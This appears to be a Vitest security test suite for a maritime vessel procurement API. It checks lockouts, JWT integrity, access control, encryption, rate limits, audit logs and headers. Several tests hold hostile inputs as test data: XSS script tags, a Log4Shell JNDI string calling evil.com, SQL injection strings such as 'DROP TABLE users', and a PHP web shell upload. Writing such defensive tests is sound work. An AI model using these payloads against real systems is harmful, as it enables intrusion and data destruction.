import { describe, it, expect, beforeAll, afterAll, beforeEach, vi } from 'vitest';
import request from 'supertest';
import { app } from '@/server';
import { PrismaClient } from '@prisma/client';
import { generateAccessToken } from '@/utils/jwt';
import { hashPassword } from '@/utils/password';
import { encrypt, decrypt } from '@/utils/encryption';

describe('Security Comprehensive Tests', () => {
  let prisma: PrismaClient;
  let testUser: any;
  let testVessel: any;
  let accessToken: string;

  beforeAll(async () => {
    prisma = new PrismaClient();
    await prisma.$connect();
  });

  afterAll(async () => {
    await prisma.$disconnect();
  });

  beforeEach(async () => {
    // Clean up test data
    await prisma.auditLog.deleteMany();
    await prisma.vesselAssignment.deleteMany();
    await prisma.vessel.deleteMany();
    await prisma.user.deleteMany();

    // Create test user
    const passwordHash = await hashPassword('SecurePassword123!');
    testUser = await prisma.user.create({
      data: {
        email: 'security@flowmarine.com',
        passwordHash,
        firstName: 'Security',
        lastName: 'Tester',
        role: 'CAPTAIN',
        emailVerified: true,
        isActive: true
      }
    });

    // Create test vessel
    testVessel = await prisma.vessel.create({
      data: {
        name: 'MV Security Test',
        imoNumber: 'IMO1111111',
        vesselType: 'CONTAINER',
        flag: 'PANAMA',
        engineType: 'DIESEL',
        cargoCapacity: 50000,
        fuelConsumption: 150,
        crewComplement: 25
      }
    });

    // Assign user to vessel
    await prisma.vesselAssignment.create({
      data: {
        userId: testUser.id,
        vesselId: testVessel.id,
        role: 'CAPTAIN',
        assignedAt: new Date()
      }
    });

    accessToken = generateAccessToken(testUser.id, [testVessel.id], testUser.role);
  });

  describe('Authentication Security', () => {
    it('should prevent brute force attacks', async () => {
      const credentials = {
        email: testUser.email,
        password: 'WrongPassword'
      };

      // Make multiple failed login attempts
      const attempts = [];
      for (let i = 0; i < 6; i++) {
        attempts.push(
          request(app)
            .post('/api/auth/login')
            .send(credentials)
        );
      }

      const responses = await Promise.all(attempts);

      // First few attempts should return 401
      expect(responses[0].status).toBe(401);
      expect(responses[1].status).toBe(401);

      // Later attempts should be rate limited or account locked
      const lastResponse = responses[responses.length - 1];
      expect([423, 429]).toContain(lastResponse.status);

      // Verify account lockout in database
      const lockedUser = await prisma.user.findUnique({
        where: { id: testUser.id }
      });
      expect(lockedUser!.failedLoginAttempts).toBeGreaterThan(0);
    });

    it('should validate JWT token integrity', async () => {
      // Test with tampered token
      const tamperedToken = accessToken.slice(0, -10) + 'tampered123';

      const response = await request(app)
        .get('/api/user/profile')
        .set('Authorization', `Bearer ${tamperedToken}`)
        .expect(403);

      expect(response.body.error).toBe('Invalid or expired token');
    });

    it('should prevent token reuse after logout', async () => {
      // Login to get fresh tokens
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: testUser.email,
          password: 'SecurePassword123!'
        })
        .expect(200);

      const { accessToken: freshToken, refreshToken } = loginResponse.body.tokens;

      // Logout
      await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${freshToken}`)
        .send({ refreshToken })
        .expect(200);

      // Try to use token after logout
      const response = await request(app)
        .get('/api/user/profile')
        .set('Authorization', `Bearer ${freshToken}`)
        .expect(401);

      expect(response.body.error).toBe('Access token required');
    });

    it('should enforce password complexity requirements', async () => {
      const weakPasswords = [
        'weak',
        '12345678',
        'password',
        'PASSWORD',
        'Pass123', // too short
        'NoNumbers!',
        'nonumbers123',
        'NOLOWERCASE123!'
      ];

      for (const weakPassword of weakPasswords) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            email: `weak${Math.random()}@test.com`,
            password: weakPassword,
            firstName: 'Test',
            lastName: 'User',
            role: 'CREW'
          })
          .expect(400);

        expect(response.body.success).toBe(false);
      }
    });
  });

  describe('Authorization Security', () => {
    it('should enforce role-based access control', async () => {
      // Create crew member with limited permissions
      const crewUser = await prisma.user.create({
        data: {
          email: 'crew@flowmarine.com',
          passwordHash: await hashPassword('CrewPassword123!'),
          firstName: 'Crew',
          lastName: 'Member',
          role: 'CREW',
          emailVerified: true,
          isActive: true
        }
      });

      await prisma.vesselAssignment.create({
        data: {
          userId: crewUser.id,
          vesselId: testVessel.id,
          role: 'CREW',
          assignedAt: new Date()
        }
      });

      const crewToken = generateAccessToken(crewUser.id, [testVessel.id], 'CREW');

      // Crew should not access admin endpoints
      const response = await request(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${crewToken}`)
        .expect(403);

      expect(response.body.error).toBe('Insufficient permissions');
    });

    it('should enforce vessel access control', async () => {
      // Create another vessel
      const otherVessel = await prisma.vessel.create({
        data: {
          name: 'MV Other Vessel',
          imoNumber: 'IMO2222222',
          vesselType: 'TANKER',
          flag: 'LIBERIA',
          engineType: 'DIESEL',
          cargoCapacity: 75000,
          fuelConsumption: 200,
          crewComplement: 30
        }
      });

      // Try to access other vessel's data
      const response = await request(app)
        .get(`/api/vessels/${otherVessel.id}/requisitions`)
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(403);

      expect(response.body.error).toBe('Access denied to vessel');
    });

    it('should validate emergency override permissions', async () => {
      // Create non-captain user
      const engineerUser = await prisma.user.create({
        data: {
          email: 'engineer@flowmarine.com',
          passwordHash: await hashPassword('EngineerPassword123!'),
          firstName: 'Chief',
          lastName: 'Engineer',
          role: 'CHIEF_ENGINEER',
          emailVerified: true,
          isActive: true
        }
      });

      const engineerToken = generateAccessToken(engineerUser.id, [testVessel.id], 'CHIEF_ENGINEER');

      // Engineer should not be able to use emergency override
      const response = await request(app)
        .post('/api/emergency/override')
        .set('Authorization', `Bearer ${engineerToken}`)
        .send({
          reason: 'Unauthorized override attempt',
          vesselId: testVessel.id
        })
        .expect(403);

      expect(response.body.error).toContain('Captain role required');
    });
  });

  describe('Data Protection', () => {
    it('should encrypt sensitive banking data', async () => {
      const sensitiveData = {
        bankName: 'Maritime Bank',
        accountNumber: '1234567890123456',
        routingNumber: '987654321',
        swiftCode: 'MARIBUS33'
      };

      // Encrypt the data
      const encryptedAccount = encrypt(sensitiveData.accountNumber);
      const encryptedRouting = encrypt(sensitiveData.routingNumber);

      // Verify encryption worked
      expect(encryptedAccount).not.toBe(sensitiveData.accountNumber);
      expect(encryptedRouting).not.toBe(sensitiveData.routingNumber);

      // Verify decryption works
      expect(decrypt(encryptedAccount)).toBe(sensitiveData.accountNumber);
      expect(decrypt(encryptedRouting)).toBe(sensitiveData.routingNumber);

      // Verify different encryptions of same data produce different results
      const encryptedAccount2 = encrypt(sensitiveData.accountNumber);
      expect(encryptedAccount).not.toBe(encryptedAccount2);
      expect(decrypt(encryptedAccount2)).toBe(sensitiveData.accountNumber);
    });

    it('should sanitize input to prevent XSS', async () => {
      const maliciousInput = {
        firstName: '<script>alert("xss")</script>',
        lastName: 'javascript:alert(1)',
        email: 'test@example.com"><script>alert("xss")</script>',
        justification: '${jndi:ldap://evil.com/a}'
      };

      const response = await request(app)
        .post('/api/auth/register')
        .send({
          ...maliciousInput,
          password: 'ValidPassword123!',
          role: 'CREW'
        })
        .expect(400);

      // Should reject malicious input
      expect(response.body.success).toBe(false);
    });

    it('should prevent SQL injection', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "admin'/*"
      ];

      for (const injection of sqlInjectionAttempts) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            email: injection,
            password: 'anypassword'
          });

        // Should not cause server error or unauthorized access
        expect([400, 401, 422]).toContain(response.status);
      }
    });

    it('should validate file upload security', async () => {
      // Test malicious file upload
      const response = await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${accessToken}`)
        .attach('file', Buffer.from('<?php system($_GET["cmd"]); ?>'), 'malicious.php')
        .expect(400);

      expect(response.body.error).toContain('Invalid file type');
    });
  });

  describe('Rate Limiting', () => {
    it('should enforce API rate limits', async () => {
      const requests = [];
      
      // Make many requests quickly
      for (let i = 0; i < 20; i++) {
        requests.push(
          request(app)
            .get('/api/user/profile')
            .set('Authorization', `Bearer ${accessToken}`)
        );
      }

      const responses = await Promise.all(requests);
      
      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should have different rate limits for different operations', async () => {
      // Login should have stricter rate limits than general API calls
      const loginRequests = [];
      
      for (let i = 0; i < 10; i++) {
        loginRequests.push(
          request(app)
            .post('/api/auth/login')
            .send({
              email: 'nonexistent@test.com',
              password: 'wrongpassword'
            })
        );
      }

      const loginResponses = await Promise.all(loginRequests);
      const rateLimited = loginResponses.filter(r => r.status === 429);
      
      expect(rateLimited.length).toBeGreaterThan(0);
    });
  });

  describe('Audit Logging', () => {
    it('should log all security-relevant events', async () => {
      // Perform various security-relevant actions
      await request(app)
        .post('/api/auth/login')
        .send({
          email: testUser.email,
          password: 'WrongPassword'
        });

      await request(app)
        .get(`/api/vessels/${testVessel.id}/sensitive-data`)
        .set('Authorization', `Bearer ${accessToken}`);

      // Check audit logs
      const auditLogs = await prisma.auditLog.findMany({
        where: {
          OR: [
            { action: 'LOGIN_FAILED' },
            { action: 'SENSITIVE_DATA_ACCESS' },
            { action: 'UNAUTHORIZED_ACCESS_ATTEMPT' }
          ]
        },
        orderBy: { createdAt: 'desc' }
      });

      expect(auditLogs.length).toBeGreaterThan(0);
      
      // Verify audit log structure
      const auditLog = auditLogs[0];
      expect(auditLog.userId).toBeDefined();
      expect(auditLog.action).toBeDefined();
      expect(auditLog.ipAddress).toBeDefined();
      expect(auditLog.userAgent).toBeDefined();
      expect(auditLog.createdAt).toBeDefined();
    });

    it('should log emergency override procedures', async () => {
      // Create emergency requisition
      const requisitionResponse = await request(app)
        .post('/api/requisitions')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          vesselId: testVessel.id,
          urgencyLevel: 'EMERGENCY',
          deliveryLocation: 'Current Position',
          deliveryDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
          justification: 'Emergency test',
          items: []
        });

      const requisitionId = requisitionResponse.body.requisition.id;

      // Use emergency override
      await request(app)
        .post(`/api/requisitions/${requisitionId}/emergency-override`)
        .set('Authorization', `Bearer ${accessToken}`)
        .send({
          reason: 'Security test emergency override'
        });

      // Check emergency override audit log
      const emergencyAudit = await prisma.auditLog.findFirst({
        where: {
          action: 'EMERGENCY_OVERRIDE',
          userId: testUser.id
        }
      });

      expect(emergencyAudit).toBeTruthy();
      expect(emergencyAudit!.metadata).toBeDefined();
    });
  });

  describe('Session Security', () => {
    it('should invalidate sessions on password change', async () => {
      // Login to get session
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: testUser.email,
          password: 'SecurePassword123!'
        });

      const { accessToken: sessionToken } = loginResponse.body.tokens;

      // Change password
      await request(app)
        .post('/api/auth/change-password')
        .set('Authorization', `Bearer ${sessionToken}`)
        .send({
          currentPassword: 'SecurePassword123!',
          newPassword: 'NewSecurePassword456!'
        })
        .expect(200);

      // Old session should be invalid
      const response = await request(app)
        .get('/api/user/profile')
        .set('Authorization', `Bearer ${sessionToken}`)
        .expect(401);

      expect(response.body.error).toBe('Access token required');
    });

    it('should detect concurrent sessions', async () => {
      // Login from multiple "devices"
      const login1 = await request(app)
        .post('/api/auth/login')
        .send({
          email: testUser.email,
          password: 'SecurePassword123!'
        });

      const login2 = await request(app)
        .post('/api/auth/login')
        .send({
          email: testUser.email,
          password: 'SecurePassword123!'
        });

      expect(login1.body.tokens.accessToken).not.toBe(login2.body.tokens.accessToken);

      // Both sessions should be tracked
      const refreshTokens = await prisma.refreshToken.findMany({
        where: { userId: testUser.id }
      });

      expect(refreshTokens.length).toBe(2);
    });
  });

  describe('IP Restriction', () => {
    it('should enforce IP restrictions for financial operations', async () => {
      // Mock IP restriction middleware
      const restrictedEndpoints = [
        '/api/payments/process',
        '/api/banking/transfer',
        '/api/financial/approve-high-value'
      ];

      for (const endpoint of restrictedEndpoints) {
        const response = await request(app)
          .post(endpoint)
          .set('Authorization', `Bearer ${accessToken}`)
          .set('X-Forwarded-For', '192.168.1.100') // Unauthorized IP
          .send({});

        expect([403, 404]).toContain(response.status);
      }
    });
  });

  describe('Data Validation', () => {
    it('should validate all input parameters', async () => {
      const invalidInputs = [
        { email: 'invalid-email' },
        { vesselId: 'invalid-uuid' },
        { amount: -100 },
        { quantity: 0 },
        { deliveryDate: 'invalid-date' },
        { latitude: 200 }, // Invalid coordinate
        { longitude: -200 } // Invalid coordinate
      ];

      for (const invalidInput of invalidInputs) {
        const response = await request(app)
          .post('/api/requisitions')
          .set('Authorization', `Bearer ${accessToken}`)
          .send({
            vesselId: testVessel.id,
            urgencyLevel: 'ROUTINE',
            deliveryLocation: 'Test Port',
            deliveryDate: new Date().toISOString(),
            justification: 'Test',
            items: [],
            ...invalidInput
          });

        expect([400, 422]).toContain(response.status);
      }
    });
  });

  describe('Security Headers', () => {
    it('should include security headers in responses', async () => {
      const response = await request(app)
        .get('/api/health')
        .expect(200);

      // Check for security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
    });
  });

  describe('Error Handling Security', () => {
    it('should not leak sensitive information in error messages', async () => {
      // Test various error conditions
      const errorTests = [
        { endpoint: '/api/auth/login', data: { email: 'test@test.com', password: 'wrong' } },
        { endpoint: '/api/users/nonexistent-id', data: {} },
        { endpoint: '/api/vessels/invalid-id', data: {} }
      ];

      for (const test of errorTests) {
        const response = await request(app)
          .post(test.endpoint)
          .send(test.data);

        // Error messages should not contain sensitive information
        const errorMessage = response.body.error || response.body.message || '';
        expect(errorMessage).not.toContain('password');
        expect(errorMessage).not.toContain('hash');
        expect(errorMessage).not.toContain('token');
        expect(errorMessage).not.toContain('database');
        expect(errorMessage).not.toContain('internal');
      }
    });
  });
});